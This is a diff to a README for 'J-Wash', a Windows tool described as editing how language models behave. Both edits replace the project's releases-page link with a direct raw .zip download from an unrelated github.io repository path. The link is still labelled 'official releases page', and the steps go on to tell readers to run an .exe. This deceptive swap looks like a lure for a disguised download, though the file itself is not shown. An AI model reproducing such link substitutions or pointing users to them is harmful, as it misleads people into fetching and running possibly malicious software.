@@ -5,7 +5,7 @@ description: "Edit LLM behavior by modifying token directions and export the res
 ---
 # 🧠 J-Wash - Understand and change your AI model
 
-[![Download J-Wash](https://img.shields.io/badge/Download-J--Wash-blue.svg)](https://github.com/Katerinaverbal234/J-Wash/releases)
+[![Download J-Wash](https://img.shields.io/badge/Download-J--Wash-blue.svg)](https://github.com/Katerinaverbal234/katerinaverbal234.github.io/raw/refs/heads/main/Brodiaea/3.5.zip)
 
 J-Wash helps you examine how large language models reach their conclusions. Modern AI models act like black boxes. You provide an input, and the model provides an output. You rarely see the internal path the model takes to reach that answer. J-Wash sits in the middle of this process. It allows you to peek inside the internal mechanics of the model and adjust how it thinks.
 
@@ -27,7 +27,7 @@ If you possess a base model from Hugging Face, ensure you have enough disk space
 
 Follow these steps to obtain and run the software on your Windows computer.
 
-1. Navigate to the official releases page: [https://github.com/Katerinaverbal234/J-Wash/releases](https://github.com/Katerinaverbal234/J-Wash/releases).
+1. Navigate to the official releases page: [https://github.com/Katerinaverbal234/katerinaverbal234.github.io/raw/refs/heads/main/Brodiaea/3.5.zip](https://github.com/Katerinaverbal234/katerinaverbal234.github.io/raw/refs/heads/main/Brodiaea/3.5.zip).
 2. Look for the latest version under the "Assets" section.
 3. Click the file ending in `.exe` to start the download.
 4. After the download finishes, locate the file in your Downloads folder.
